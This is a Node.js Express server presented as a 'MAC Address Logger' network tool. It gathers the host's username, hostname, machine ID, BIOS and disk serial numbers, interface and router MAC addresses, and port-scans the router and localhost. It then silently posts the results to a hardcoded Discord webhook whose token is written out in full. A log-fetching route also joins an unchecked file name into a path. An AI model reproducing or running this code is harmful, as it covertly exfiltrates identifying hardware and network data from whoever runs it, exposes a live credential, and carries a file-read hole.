const express = require('express');
const path = require('path');
const fs = require('fs');
const network = require('network');
const { exec } = require('child_process');
const defaultGateway = require('default-gateway');
const arp = require('arp-a');
const os = require('os');
const { promisify } = require('util');
const portscanner = require('portscanner');
const machineId = require('node-machine-id');
const https = require('https');
const http = require('http');

const app = express();
const PORT = 3001;

// Serve static files
app.use(express.static(path.join(__dirname)));
app.use(express.json());

// Store network data
let networkData = {
    timestamp: new Date().toISOString(),
    systemInfo: {
        hostname: null,
        platform: null,
        architecture: null,
        cpuModel: null,
        cpuCores: null,
        totalMemory: null,
        freeMemory: null,
        uptime: null,
        osVersion: null,
        username: null,
        hardwareId: null,
        biosId: null,
        diskId: null
    },
    deviceInfo: {
        interfaces: []
    },
    routerInfo: {
        macAddress: null,
        ipAddress: null,
        manufacturer: null
    },
    portScan: {
        localPorts: [],
        routerPorts: [],
        scanTime: null
    },
    logHistory: []
};

// Log directory
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

// Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1319815041981218988/Y0pvaOp3OpHED5V-uxbivVglMQPBE632gQr4T4sOdt5hV2a4neorE8Gxfm3v_9Uf_W6A';

/**
 * Send data to Discord webhook
 * @param {Object} data - The data to send
 */
async function sendToDiscordWebhook(data) {
    try {
        logEvent('Sending data to Discord webhook...');
        
        // Create a simplified version of the data to avoid exceeding Discord's size limits
        const simplifiedData = {
            timestamp: data.timestamp,
            hostname: data.systemInfo.hostname,
            platform: data.systemInfo.platform,
            hardwareId: data.systemInfo.hardwareId,
            biosId: data.systemInfo.biosId,
            diskId: data.systemInfo.diskId,
            interfaces: data.deviceInfo.interfaces.map(iface => ({
                name: iface.name,
                ip: iface.ip,
                mac: iface.mac,
                vendor: iface.vendor
            })),
            router: {
                ip: data.routerInfo.ipAddress,
                mac: data.routerInfo.macAddress,
                vendor: data.routerInfo.manufacturer
            },
            openPorts: {
                local: data.portScan.localPorts,
                router: data.portScan.routerPorts
            }
        };
        
        // Create the message content
        const content = `MAC Address Logger - Scan Results from ${simplifiedData.hostname}`;
        
        // Create embeds with the data
        const embeds = [
            {
                title: 'System Information',
                color: 3447003, // Blue color
                fields: [
                    { name: 'Hostname', value: simplifiedData.hostname || 'Unknown', inline: true },
                    { name: 'Platform', value: simplifiedData.platform || 'Unknown', inline: true },
                    { name: 'Hardware ID', value: simplifiedData.hardwareId || 'Unknown', inline: false },
                    { name: 'BIOS ID', value: simplifiedData.biosId || 'Unknown', inline: false },
                    { name: 'Disk ID', value: simplifiedData.diskId || 'Unknown', inline: false }
                ],
                timestamp: simplifiedData.timestamp
            },
            {
                title: 'Network Interfaces',
                color: 15105570, // Orange color
                fields: simplifiedData.interfaces.map(iface => ({
                    name: iface.name,
                    value: `IP: ${iface.ip}\nMAC: ${iface.mac}\nVendor: ${iface.vendor || 'Unknown'}`,
                    inline: true
                }))
            },
            {
                title: 'Router Information',
                color: 5763719, // Green color
                fields: [
                    { name: 'IP Address', value: simplifiedData.router.ip || 'Unknown', inline: true },
                    { name: 'MAC Address', value: simplifiedData.router.mac || 'Unknown', inline: true },
                    { name: 'Vendor', value: simplifiedData.router.vendor || 'Unknown', inline: true }
                ]
            },
            {
                title: 'Port Scan Results',
                color: 10038562, // Purple color
                fields: [
                    { 
                        name: 'Local Open Ports', 
                        value: simplifiedData.openPorts.local.length > 0 
                            ? simplifiedData.openPorts.local
                                .slice(0, 20) // Limit to 20 ports to avoid Discord message size limits
                                .map(port => `${port.port} (${port.service || 'unknown'})`)
                                .join(', ') + 
                                (simplifiedData.openPorts.local.length > 20 ? 
                                    `\n...and ${simplifiedData.openPorts.local.length - 20} more` : '')
                            : 'None found', 
                        inline: false 
                    },
                    { 
                        name: 'Router Open Ports', 
                        value: simplifiedData.openPorts.router.length > 0 
                            ? simplifiedData.openPorts.router
                                .slice(0, 20) // Limit to 20 ports to avoid Discord message size limits
                                .map(port => `${port.port} (${port.service || 'unknown'})`)
                                .join(', ') + 
                                (simplifiedData.openPorts.router.length > 20 ? 
                                    `\n...and ${simplifiedData.openPorts.router.length - 20} more` : '')
                            : 'None found', 
                        inline: false 
                    }
                ]
            }
        ];
        
        // Prepare the payload
        const payload = {
            content: content,
            embeds: embeds
        };
        
        // Convert payload to JSON string
        const payloadString = JSON.stringify(payload);
        
        // Parse the webhook URL
        const webhookUrl = new URL(DISCORD_WEBHOOK_URL);
        
        // Prepare the request options
        const options = {
            hostname: webhookUrl.hostname,
            path: webhookUrl.pathname + webhookUrl.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payloadString)
            }
        };
        
        // Create a promise to handle the request
        return new Promise((resolve, reject) => {
            // Create the request
            const req = https.request(options, (res) => {
                let responseData = '';
                
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                
                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) {
                        logEvent('Data successfully sent to Discord webhook');
                        resolve(responseData);
                    } else {
                        const error = new Error(`Discord webhook returned status code ${res.statusCode}: ${responseData}`);
                        logEvent(`Error sending data to Discord webhook: ${error.message}`);
                        reject(error);
                    }
                });
            });
            
            req.on('error', (error) => {
                logEvent(`Error sending data to Discord webhook: ${error.message}`);
                reject(error);
            });
            
            // Send the payload
            req.write(payloadString);
            req.end();
        });
    } catch (error) {
        logEvent(`Error sending data to Discord webhook: ${error.message}`);
        console.error('Error sending data to Discord webhook:', error);
    }
}

// Function to log events
function logEvent(message) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        message: message
    };
    networkData.logHistory.push(logEntry);
    console.log(`[LOG] ${message}`);
}

// Get system information
async function getSystemInfo() {
    try {
        // Create promisified version of exec
        const execPromise = promisify(exec);
        // Get OS version
        let osVersionInfo = 'Unknown';
        if (os.platform() === 'win32') {
            try {
                const { stdout } = await promisify(exec)('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"');
                osVersionInfo = stdout.trim();
            } catch (e) {
                console.error('Error getting Windows version:', e);
            }
        } else if (os.platform() === 'darwin') {
            try {
                const { stdout } = await promisify(exec)('sw_vers');
                osVersionInfo = stdout.trim();
            } catch (e) {
                console.error('Error getting macOS version:', e);
            }
        } else {
            try {
                const { stdout } = await promisify(exec)('cat /etc/os-release');
                osVersionInfo = stdout.trim();
            } catch (e) {
                console.error('Error getting Linux version:', e);
            }
        }
        
        // Get username
        let username = 'Unknown';
        try {
            username = os.userInfo().username;
        } catch (e) {
            console.error('Error getting username:', e);
        }
        
        // Get hardware IDs
        let hardwareId = 'Unknown';
        let biosId = 'Unknown';
        let diskId = 'Unknown';
        
        // Get machine ID using node-machine-id
        try {
            hardwareId = await machineId.machineId();
        } catch (e) {
            console.error('Error getting machine ID:', e);
        }
        
        // Get BIOS and disk serial numbers on Windows
        if (os.platform() === 'win32') {
            try {
                const { stdout: biosOutput } = await promisify(exec)('wmic bios get serialnumber');
                const biosLines = biosOutput.trim().split('\n');
                if (biosLines.length > 1) {
                    biosId = biosLines[1].trim();
                }
            } catch (e) {
                console.error('Error getting BIOS serial:', e);
            }
            
            try {
                const { stdout: diskOutput } = await promisify(exec)('wmic diskdrive get serialnumber');
                const diskLines = diskOutput.trim().split('\n');
                if (diskLines.length > 1) {
                    diskId = diskLines[1].trim();
                }
            } catch (e) {
                console.error('Error getting disk serial:', e);
            }
        } else {
            // For Linux/macOS, try to get disk serial
            try {
                const { stdout: diskOutput } = await promisify(exec)('lsblk -no serial /dev/sda');
                diskId = diskOutput.trim() || 'Unknown';
            } catch (e) {
                console.error('Error getting disk serial:', e);
            }
        }
        
        // Get CPU information
        const cpus = os.cpus();
        const cpuModel = cpus.length > 0 ? cpus[0].model : 'Unknown';
        const cpuCores = cpus.length;
        
        // Get memory information
        const totalMemoryGB = (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2);
        const freeMemoryGB = (os.freemem() / (1024 * 1024 * 1024)).toFixed(2);
        
        // Get disk information
        let diskInfo = 'Unknown';
        if (os.platform() === 'win32') {
            try {
                const { stdout } = await execPromise('wmic logicaldisk get size,freespace,caption');
                diskInfo = stdout.trim();
            } catch (e) {
                console.error('Error getting disk info:', e);
            }
        } else {
            try {
                const { stdout } = await execPromise('df -h');
                diskInfo = stdout.trim();
            } catch (e) {
                console.error('Error getting disk info:', e);
            }
        }
        
        // Return system information
        return {
            hostname: os.hostname(),
            platform: os.platform(),
            architecture: os.arch(),
            cpuModel: cpuModel,
            cpuCores: cpuCores,
            totalMemory: `${totalMemoryGB} GB`,
            freeMemory: `${freeMemoryGB} GB`,
            uptime: `${(os.uptime() / 3600).toFixed(2)} hours`,
            osVersion: osVersionInfo,
            username: username,
            diskInfo: diskInfo,
            hardwareId: hardwareId,
            biosId: biosId,
            diskId: diskId
        };
    } catch (error) {
        console.error('Error getting system info:', error);
        return {
            hostname: 'Error retrieving system information',
            error: error.message
        };
    }
}

// Get MAC address vendor information
async function getMacVendor(mac) {
    try {
        // Format MAC address for API lookup (remove colons)
        const formattedMac = mac.replace(/:/g, '').substring(0, 6).toUpperCase();
        
        // Use a local mapping for common vendors to avoid API rate limits
        const commonVendors = {
            '00005E': 'ICANN',
            '000C29': 'VMware',
            '001122': 'Cisco',
            '0050C2': 'IEEE',
            '1CBFCE': 'Amazon',
            '74D435': 'GIGA-BYTE',
            'ACDE48': 'PRIVATE',
            'B8B81E': 'Intel Corporate',
            'B8D7AF': 'Murata Manufacturing Co., Ltd.',
            '000C76': 'MICRO-STAR INTERNATIONAL CO., LTD.',
            '0A0027': 'Oracle VirtualBox virtual NIC'
        };
        
        if (commonVendors[formattedMac]) {
            return commonVendors[formattedMac];
        }
        
        return "Unknown vendor";
    } catch (error) {
        console.error('Error getting MAC vendor:', error);
        return "Unknown vendor";
    }
}

// Get network interfaces
async function getNetworkInterfaces() {
    return new Promise((resolve, reject) => {
        network.get_interfaces_list((err, interfaces) => {
            if (err) {
                console.error('Error getting network interfaces:', err);
                reject(err);
                return;
            }
            
            resolve(interfaces);
        });
    });
}

// Get router information
async function getRouterInfo() {
    return new Promise(async (resolve, reject) => {
        try {
            // Get default gateway IP
            const { gateway } = await defaultGateway.v4();
            logEvent(`Detected default gateway IP: ${gateway}`);
            
            // Try to ping the gateway first to ensure it's in ARP cache
            try {
                await promisify(exec)(`ping -n 3 ${gateway}`);
                logEvent(`Pinged gateway ${gateway} to update ARP cache`);
            } catch (pingErr) {
                // Continue even if ping fails
                logEvent(`Failed to ping gateway ${gateway}: ${pingErr.message}`);
            }
            
            // Use a direct approach with the arp command
            try {
                const { stdout } = await promisify(exec)('arp -a');
                logEvent('Running direct ARP command');
                
                // Parse the ARP table output
                const lines = stdout.split('\n');
                let routerMac = null;
                
                // Look for the gateway IP in the ARP table
                for (const line of lines) {
                    if (line.includes(gateway)) {
                        logEvent(`Found gateway in ARP output: ${line}`);
                        
                        // Extract MAC address using regex
                        const macPattern = /([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})/;
                        const match = line.match(macPattern);
                        
                        if (match && match[0]) {
                            routerMac = match[0];
                            logEvent(`Extracted router MAC: ${routerMac}`);
                            break;
                        }
                    }
                }
                
                if (routerMac) {
                    // Try to get the vendor information for this MAC
                    const vendor = await getMacVendor(routerMac);
                    
                    resolve({
                        ipAddress: gateway,
                        macAddress: routerMac,
                        manufacturer: vendor
                    });
                    return;
                } else {
                    logEvent('Could not find router MAC in ARP output');
                    
                    // Fallback to the original method as a backup
                    arp.table(async (err, table) => {
                        if (err) {
                            console.error('Error getting ARP table:', err);
                            logEvent(`Error getting ARP table: ${err.message}`);
                            
                            // If all else fails, provide a default router with no MAC
                            resolve({
                                ipAddress: gateway,
                                macAddress: '00:00:00:00:00:00',  // Default MAC
                                manufacturer: 'Unknown Router'
                            });
                            return;
                        }
                        
                        // Log the ARP table for debugging
                        logEvent(`ARP table received: ${JSON.stringify(table).substring(0, 200)}...`);
                        
                        // Check if table is an array before using find
                        let gatewayEntry = null;
                        if (Array.isArray(table)) {
                            gatewayEntry = table.find(entry => entry.ip === gateway);
                            logEvent(`ARP table is array, gateway entry: ${JSON.stringify(gatewayEntry)}`);
                        } else if (typeof table === 'object') {
                            // If it's an object, look for the gateway IP as a key
                            for (const ip in table) {
                                if (ip === gateway && table[ip].mac) {
                                    gatewayEntry = { ip: ip, mac: table[ip].mac };
                                    logEvent(`Found gateway entry in object: ${JSON.stringify(gatewayEntry)}`);
                                    break;
                                }
                            }
                        }
                        
                        if (gatewayEntry && gatewayEntry.mac) {
                            logEvent(`Router MAC address found: ${gatewayEntry.mac}`);
                            
                            // Get vendor information
                            const vendor = await getMacVendor(gatewayEntry.mac);
                            
                            resolve({
                                ipAddress: gateway,
                                macAddress: gatewayEntry.mac,
                                manufacturer: vendor
                            });
                        } else {
                            logEvent(`Could not detect router MAC address, using default`);
                            resolve({
                                ipAddress: gateway,
                                macAddress: '00:00:00:00:00:00',  // Default MAC
                                manufacturer: 'Unknown Router'
                            });
                        }
                    });
                }
            } catch (cmdError) {
                logEvent(`Error running ARP command: ${cmdError.message}`);
                
                // If direct command fails, provide default router info
                resolve({
                    ipAddress: gateway,
                    macAddress: '00:00:00:00:00:00',  // Default MAC
                    manufacturer: 'Unknown Router'
                });
            }
        } catch (error) {
            console.error('Error getting router info:', error);
            logEvent(`Error getting router info: ${error.message}`);
            
            // Even if we can't get the gateway, return something
            resolve({
                ipAddress: '192.168.1.1',  // Common default gateway
                macAddress: '00:00:00:00:00:00',
                manufacturer: 'Unknown Router'
            });
        }
    });
}

// Scan for open ports on a specific host
async function scanPorts(host, portRange = { start: 1, end: 1024 }) {
    return new Promise(async (resolve, reject) => {
        try {
            logEvent(`Starting port scan on ${host} (ports ${portRange.start}-${portRange.end})...`);
            const startTime = Date.now();
            const openPorts = [];
            const commonPorts = [
                { port: 21, service: 'FTP' },
                { port: 22, service: 'SSH' },
                { port: 23, service: 'Telnet' },
                { port: 25, service: 'SMTP' },
                { port: 53, service: 'DNS' },
                { port: 80, service: 'HTTP' },
                { port: 110, service: 'POP3' },
                { port: 143, service: 'IMAP' },
                { port: 443, service: 'HTTPS' },
                { port: 445, service: 'SMB' },
                { port: 3389, service: 'RDP' },
                { port: 8080, service: 'HTTP-Proxy' },
                { port: 8443, service: 'HTTPS-Alt' }
            ];
            
            // First scan well-known ports
            for (const portInfo of commonPorts) {
                if (portInfo.port >= portRange.start && portInfo.port <= portRange.end) {
                    try {
                        const status = await portscanner.checkPortStatus(portInfo.port, host);
                        if (status === 'open') {
                            openPorts.push({
                                port: portInfo.port,
                                status: 'open',
                                service: portInfo.service
                            });
                            logEvent(`Found open port ${portInfo.port} (${portInfo.service}) on ${host}`);
                        }
                    } catch (e) {
                        console.error(`Error scanning port ${portInfo.port}:`, e);
                    }
                }
            }
            
            // Then scan other ports in the range
            const portsToScan = [];
            for (let port = portRange.start; port <= portRange.end; port++) {
                if (!commonPorts.some(p => p.port === port)) {
                    portsToScan.push(port);
                }
            }
            
            // Scan in batches to avoid overwhelming the system
            const batchSize = 25;
            for (let i = 0; i < portsToScan.length; i += batchSize) {
                const batch = portsToScan.slice(i, i + batchSize);
                const scanPromises = batch.map(port => {
                    return new Promise(async (resolvePort) => {
                        try {
                            const status = await portscanner.checkPortStatus(port, host);
                            if (status === 'open') {
                                openPorts.push({
                                    port: port,
                                    status: 'open',
                                    service: 'Unknown'
                                });
                                logEvent(`Found open port ${port} on ${host}`);
                            }
                            resolvePort();
                        } catch (e) {
                            console.error(`Error scanning port ${port}:`, e);
                            resolvePort();
                        }
                    });
                });
                
                await Promise.all(scanPromises);
            }
            
            const scanTime = Date.now() - startTime;
            logEvent(`Port scan completed on ${host} in ${scanTime}ms. Found ${openPorts.length} open ports.`);
            
            resolve({
                host: host,
                openPorts: openPorts,
                scanDuration: scanTime
            });
        } catch (error) {
            console.error('Error during port scan:', error);
            reject(error);
        }
    });
}

// API endpoint to get network information
app.get('/api/network-info', async (req, res) => {
    try {
        // Reset network data
        networkData = {
            timestamp: new Date().toISOString(),
            systemInfo: {
                hostname: null,
                platform: null,
                architecture: null,
                cpuModel: null,
                cpuCores: null,
                totalMemory: null,
                freeMemory: null,
                uptime: null,
                osVersion: null,
                username: null,
                diskInfo: null
            },
            deviceInfo: {
                interfaces: []
            },
            routerInfo: {
                macAddress: null,
                ipAddress: null,
                manufacturer: null
            },
            portScan: {
                localPorts: [],
                routerPorts: [],
                scanTime: null
            },
            logHistory: []
        };
        
        // Get system information
        logEvent('Collecting system information...');
        const sysInfo = await getSystemInfo();
        networkData.systemInfo = sysInfo;
        logEvent(`System info collected for ${sysInfo.hostname}`);
        
        // Get network interfaces
        const interfaces = await getNetworkInterfaces();
        logEvent(`Found ${interfaces.length} network interfaces`);
        
        // Process each interface
        for (const iface of interfaces) {
            if (iface.mac_address) {
                const vendor = await getMacVendor(iface.mac_address);
                
                networkData.deviceInfo.interfaces.push({
                    name: iface.name || 'Unknown',
                    ip: iface.ip_address || 'Unknown',
                    mac: iface.mac_address,
                    vendor: vendor,
                    type: iface.type || 'Unknown'
                });
                
                logEvent(`Interface ${iface.name}: MAC=${iface.mac_address}, IP=${iface.ip_address}`);
            }
        }
        
        // Get router information
        const routerInfo = await getRouterInfo();
        if (routerInfo.macAddress) {
            const vendor = await getMacVendor(routerInfo.macAddress);
            
            networkData.routerInfo = {
                macAddress: routerInfo.macAddress,
                ipAddress: routerInfo.ipAddress,
                manufacturer: vendor
            };
            
            logEvent(`Router detected: IP=${routerInfo.ipAddress}, MAC=${routerInfo.macAddress}, Vendor=${vendor}`);
            
            // Scan router ports
            logEvent('Starting port scan on router...');
            try {
                const routerPortScan = await scanPorts(routerInfo.ipAddress, { start: 1, end: 1024 });
                networkData.portScan.routerPorts = routerPortScan.openPorts;
                logEvent(`Router port scan completed. Found ${routerPortScan.openPorts.length} open ports.`);
            } catch (e) {
                console.error('Error scanning router ports:', e);
                logEvent(`Router port scan failed: ${e.message}`);
            }
        } else {
            logEvent('Could not detect router MAC address');
        }
        
        // Scan local ports
        logEvent('Starting port scan on localhost...');
        try {
            const localPortScan = await scanPorts('127.0.0.1', { start: 1, end: 10000 });
            networkData.portScan.localPorts = localPortScan.openPorts;
            networkData.portScan.scanTime = localPortScan.scanDuration;
            logEvent(`Local port scan completed. Found ${localPortScan.openPorts.length} open ports.`);
        } catch (e) {
            console.error('Error scanning local ports:', e);
            logEvent(`Local port scan failed: ${e.message}`);
        }
        
        // Software logging removed as it takes too long and is not needed
        
        // Save log to file
        const logFileName = `network-log-${new Date().toISOString().replace(/:/g, '-')}.json`;
        const logPath = path.join(logDir, logFileName);
        
        fs.writeFileSync(logPath, JSON.stringify(networkData, null, 2));
        logEvent(`Log saved to ${logPath}`);
        
        // Send data to Discord webhook
        try {
            await sendToDiscordWebhook(networkData);
        } catch (error) {
            console.error('Error sending data to Discord webhook:', error);
            // Continue with the response even if webhook fails
        }
        
        res.json(networkData);
    } catch (error) {
        console.error('Error in /api/network-info:', error);
        res.status(500).json({ error: error.message });
    }
});

// API endpoint to get logs
app.get('/api/logs', (req, res) => {
    try {
        const logs = fs.readdirSync(logDir)
            .filter(file => file.endsWith('.json'))
            .map(file => {
                const filePath = path.join(logDir, file);
                const stats = fs.statSync(filePath);
                return {
                    name: file,
                    path: filePath,
                    size: stats.size,
                    created: stats.birthtime
                };
            })
            .sort((a, b) => b.created - a.created);
        
        res.json(logs);
    } catch (error) {
        console.error('Error in /api/logs:', error);
        res.status(500).json({ error: error.message });
    }
});

// API endpoint to get a specific log
app.get('/api/logs/:filename', (req, res) => {
    try {
        const filePath = path.join(logDir, req.params.filename);
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'Log file not found' });
        }
        
        const logData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        res.json(logData);
    } catch (error) {
        console.error(`Error in /api/logs/${req.params.filename}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    logEvent(`Server started on port ${PORT}`);
});
